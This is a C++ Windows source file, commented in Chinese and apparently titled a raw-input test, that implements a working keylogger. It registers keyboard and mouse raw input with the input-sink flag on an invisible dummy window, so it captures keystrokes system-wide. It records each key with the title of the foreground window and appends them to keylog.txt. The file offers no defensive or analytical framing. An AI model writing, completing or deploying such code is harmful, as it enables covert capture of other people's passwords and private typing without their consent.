#include "pch.h"
#include "RawInputTest.h"
#include "VirtualKeyToAscii.h"





void ShowError(const char* pszText)
{
	char szErr[MAX_PATH] = { 0 };
	::wsprintf(szErr, "%s Error[%d]\n", pszText, ::GetLastError());
	::MessageBox(NULL, szErr, "ERROR", MB_OK);
}


// 注册原始输入设备
BOOL Init(HWND hWnd)
{
	/*
	// 设置 RAWINPUTDEVICE 结构体信息
	RAWINPUTDEVICE rawinputDevice = { 0 };
	rawinputDevice.usUsagePage = 0x01;
	rawinputDevice.usUsage = 0x06;
	rawinputDevice.dwFlags = RIDEV_INPUTSINK;
	rawinputDevice.hwndTarget = hWnd;
	// 注册原始输入设备
	BOOL bRet = ::RegisterRawInputDevices(&rawinputDevice, 1, sizeof(rawinputDevice));
	if (FALSE == bRet)
	{
		ShowError("RegisterRawInputDevices");
		return FALSE;
	}
	*/


	// 注册原始输入设备，接收键盘和鼠标的原始输入
	RAWINPUTDEVICE rid[2];
	rid[0].usUsagePage = 0x01; // HID_USAGE_PAGE_GENERIC
	rid[0].usUsage = 0x06;     // HID_USAGE_GENERIC_KEYBOARD
	rid[0].dwFlags = RIDEV_INPUTSINK;
	rid[0].hwndTarget = hWnd;
	rid[1].usUsagePage = 0x01; // HID_USAGE_PAGE_GENERIC
	rid[1].usUsage = 0x02;     // HID_USAGE_GENERIC_MOUSE
	rid[1].dwFlags = RIDEV_INPUTSINK;
	rid[1].hwndTarget = hWnd;
	if (!RegisterRawInputDevices(rid, 2, sizeof(RAWINPUTDEVICE)))
	{
		MessageBox(NULL, "Failed to register raw input devices!", "Error", MB_ICONERROR);
		return FALSE;
	}

	return TRUE;
}


// 获取原始输入数据
BOOL GetData(LPARAM lParam)
{
	RAWINPUT rawinputData = { 0 };
	UINT uiSize = sizeof(rawinputData);

	// 获取原始输入数据的大小
	::GetRawInputData((HRAWINPUT)lParam, RID_INPUT, &rawinputData, &uiSize, sizeof(RAWINPUTHEADER));
	if (RIM_TYPEKEYBOARD == rawinputData.header.dwType)
	{
		// WM_KEYDOWN --> 普通按键    WM_SYSKEYDOWN --> 系统按键(指的是ALT)  
		if ((WM_KEYDOWN == rawinputData.data.keyboard.Message) ||
			(WM_SYSKEYDOWN == rawinputData.data.keyboard.Message))
		{
			// 记录按键
			SaveKey(rawinputData.data.keyboard.VKey);
		}
	}
	return TRUE;
}


// 保存按键信息
void SaveKey(USHORT usVKey)
{
	char szKey[MAX_PATH] = { 0 };
	char szTitle[MAX_PATH] = { 0 };
	char szText[MAX_PATH] = { 0 };
	FILE* fp = NULL;
	// 获取顶层窗口
	HWND hForegroundWnd = ::GetForegroundWindow();
	// 获取顶层窗口标题
	::GetWindowText(hForegroundWnd, szTitle, 256);
	// 将虚拟键码转换成对应的ASCII
	::lstrcpy(szKey, GetKeyName(usVKey));
	// 构造按键记录信息字符串
	::wsprintf(szText, "[%s] %s\r\n", szTitle, szKey);
	// 打开文件写入按键记录数据
	::fopen_s(&fp, "keylog.txt", "a+");
	if (NULL == fp)
	{
		ShowError("fopen_s");
		return;
	}
	::fwrite(szText, (1 + ::lstrlen(szText)), 1, fp);
	::fclose(fp);
}

LRESULT CALLBACK DummyWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{


	switch (msg)
	{
	case WM_INPUT:
	
		GetData(lParam);
		break;
	case WM_EXIT_APP:
		PostQuitMessage(0); // 退出消息循环
		break;
	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hwnd, msg, wParam, lParam);
	}
	return 0;
}

int initApp() {
	
	HINSTANCE hInstance = GetModuleHandle(NULL);

	// 创建一个虚拟窗口，用于接收全局的 WM_INPUT 消息
	WNDCLASS wc = { 0 };
	wc.lpfnWndProc = DummyWndProc; // 虚拟窗口过程函数
	wc.hInstance = hInstance;
	wc.lpszClassName = "DummyWindowClass";

	if (!RegisterClass(&wc))
	{
		MessageBox(NULL, "Window Registration Failed!", "Error", MB_ICONERROR);
		//FreeLibrary(hDLL);
		return 1;
	}

	HWND hwnd = CreateWindow(
		"DummyWindowClass", // 窗口类名
		"Dummy Window",     // 窗口标题（无实际显示）
		0,                  // 窗口样式（无边框、无标题）
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		NULL,               // 无父窗口
		NULL,               // 无菜单
		hInstance,
		NULL
	);

	if (!hwnd)
	{
		MessageBox(NULL, "Window Creation Failed!", "Error", MB_ICONERROR);
		//FreeLibrary(hDLL);
		return 1;
	}

	Init(hwnd);

	// 消息循环
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	//FreeLibrary(hDLL);
	return msg.wParam;
	
}